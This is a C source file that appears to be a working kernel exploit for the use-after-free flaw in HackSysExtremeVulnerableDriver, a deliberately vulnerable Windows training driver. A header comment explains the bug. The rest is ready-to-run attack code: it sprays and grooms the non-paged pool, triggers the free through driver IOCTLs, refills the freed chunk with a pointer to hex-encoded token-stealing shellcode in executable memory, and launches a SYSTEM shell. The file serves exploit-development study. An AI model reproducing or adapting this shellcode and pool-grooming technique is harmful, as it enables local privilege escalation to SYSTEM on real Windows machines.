
/*

NTSTATUS FreeUaFObject() {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
    PAGED_CODE();
 
    __try {
        if (g_UseAfterFreeObject) {
            DbgPrint("[+] Freeing UaF Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObject);
 
#ifdef SECURE
            // Secure Note: This is secure because the developer is setting
            // 'g_UseAfterFreeObject' to NULL once the Pool chunk is being freed
            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);
 
            g_UseAfterFreeObject = NULL;
#else
            // Vulnerability Note: This is a vanilla Use After Free vulnerability
            // because the developer is not setting 'g_UseAfterFreeObject' to NULL.
            // Hence, g_UseAfterFreeObject still holds the reference to stale pointer
            // (dangling pointer)
            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);
#endif
 
            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

'''
Fairly straight forward, this frees the pool chunk by referencing the tag value.
This is the function that contains the vulnerability in that "g_UseAfterFreeObject"
is not set to null after the object is freed and so retains a stale object pointer.
'''

<-----------------
To Put it simply The driver lets us initialize a kernel object with a pointer that is later freed 
(that means we can change the content of that memory location) and then we can call a callback on that freed memory (use it)
with a little extra memory manipulation we can replace the content in that address to a pointer to our shell code again leading to
code execution.
---------------->


*/


#include <Windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

#define IoCo 1


typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	UNICODE_STRING *ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


typedef NTSTATUS(__stdcall* pfNtAllocateReserveObject)(
	_Out_ PHANDLE hObject,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ DWORD ObjectType
);

#define IO_COMPLETION_OBJECT 1

typedef struct _FAKE_OBJECT {
	CHAR buffer[0x58];
} FAKE_OBJECT, *PFAKE_OBJECT;

HANDLE    ReserveObjectArrayA[10000];
HANDLE    ReserveObjectArrayB[5000];


VOID SprayNonPagedPool() {
	UINT32 i = 0;
	HMODULE hModule = NULL;

	hModule = LoadLibraryA("ntdll.dll");

	if (!hModule) {
		exit(EXIT_FAILURE);
	}

	pfNtAllocateReserveObject NtAllocateReserveObject = (pfNtAllocateReserveObject)GetProcAddress(
		hModule, "NtAllocateReserveObject");

	for (i = 0; i < 10000; i++) {
		NtAllocateReserveObject(&ReserveObjectArrayA[i], 0, IO_COMPLETION_OBJECT);
	}

	for (i = 0; i < 5000; i++) {
		NtAllocateReserveObject(&ReserveObjectArrayB[i], 0, IO_COMPLETION_OBJECT);
	}
}

VOID CreateHolesInNonPagedPool() {
	UINT32 i = 0;

	for (i = 0; i < 5000; i += 2) {
		if (!CloseHandle(ReserveObjectArrayB[i])) {
		}
	}
}

VOID FreeObjects() {
	UINT32 i = 0;

	for (i = 0; i < 10000; i++) {
		if (!CloseHandle(ReserveObjectArrayA[i])) {
		}
	}

	for (i = 1; i < 5000; i += 2) {
		if (!CloseHandle(ReserveObjectArrayB[i])) {
		}
	}
}


int main()
{

	UINT32 i = 0;
	HANDLE hFile = NULL;
	ULONG BytesReturned;
	PFAKE_OBJECT FakeObject = NULL;
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	char pl[66] =
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x31\xC0"
		"\xC3"
		;

	LPVOID pla = VirtualAlloc(
		NULL,
		sizeof(pl),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pla, pl, sizeof(pl));
	LPVOID PayloadPtr = &pla;


	FakeObject = (PFAKE_OBJECT)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(FAKE_OBJECT));
	RtlFillMemory((PVOID)FakeObject, sizeof(FAKE_OBJECT), 0x41);

	FakeObject->buffer[sizeof(FakeObject->buffer) - 1] = '\0';
	*(PULONG)FakeObject = (ULONG)pla;

	SprayNonPagedPool();
	CreateHolesInNonPagedPool();

	// DebugBreak();


	DWORD bytesReturned = 0;
	// Create
	DeviceIoControl(
		dev,
		0x222013,
		NULL,
		0,
		NULL,
		0,
		&bytesReturned,
		(LPOVERLAPPED)NULL
	);
	// Free
	DeviceIoControl(
		dev,
		0x22201B,
		NULL,
		0,
		NULL,
		0,
		&bytesReturned,
		(LPOVERLAPPED)NULL
	);

	

	byte Buff[0x58] = { 0 };
	memcpy(Buff, PayloadPtr, 4); 
	memset(Buff + 4, '\x42', 0x54); 
	memset(Buff + 0x57, '\x00', 1);

	// Spray..
	for (int i = 0; i < 5000; i++) {
		DeviceIoControl(
			dev,
			0x22201F,
			Buff,
			sizeof(Buff),
			NULL,
			0,
			&bytesReturned,
			(LPOVERLAPPED)NULL
		);
	}

	
	DeviceIoControl(
		dev,
		0x222017,
		NULL,
		0,
		NULL,
		0,
		&bytesReturned,
		(LPOVERLAPPED)NULL
	);

	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}
